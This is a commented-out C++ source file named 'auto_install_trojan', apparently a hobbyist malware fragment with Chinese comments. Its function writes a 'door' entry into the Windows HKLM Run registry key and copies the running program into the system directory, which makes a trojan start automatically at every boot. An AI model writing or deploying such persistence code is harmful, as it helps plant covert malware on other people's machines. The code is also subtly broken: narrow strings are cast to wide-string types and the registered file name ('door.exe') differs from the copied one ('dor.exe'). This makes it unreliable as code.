//#ifndef AUTO_INSTALL_TROJAN_CPP
//#define AUTO_INSTALL_TROJAN_CPP
//
////#define AUTO_INSTALL_TROJAN_TEST
//
//#include <stdio.h>
//#include <WinSock2.h>
//
//int auto_install_trojan()
//{
//	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
//	HKEY hkResult;
//	int ret;
//	ret = RegOpenKey(HKEY_LOCAL_MACHINE, (LPCWSTR)regname, &hkResult);
//	//打开关键字
//	ret = RegSetValueEx(hkResult, (LPCWSTR)"door", 0, REG_EXPAND_SZ, (unsigned char*)"%systemroot%\\door.exe", 25);
//	//设置键值
//	if (ret == 0)
//	{
//		printf("success to write run key\n");
//		RegCloseKey(hkResult);
//	}
//	else
//	{
//		printf("failed to open regedit.%d\n", ret);
//		return 0;
//	}
//
//	char modlepath[256];
//	char syspath[256];
//	GetModuleFileName(0, (LPWSTR)modlepath, 256);
//	//获取程序名称
//	GetSystemDirectory((LPWSTR)syspath, 256);
//	ret = CopyFile((LPCWSTR)modlepath, (LPCWSTR)strcat(syspath, "\\dor.exe"), 1);
//	if (ret)
//	{
//		printf("%s has been copyed to sys dir %s\n", modlepath, syspath);
//	}
//	else
//	{
//		printf("%s is exisis", modlepath);
//	}
//
//	return 0;
//}
//
//#ifdef AUTO_INSTALL_TROJAN_TEST
//int main()
//{
//	return auto_install_trojan();
//}
//#endif
//
//#endif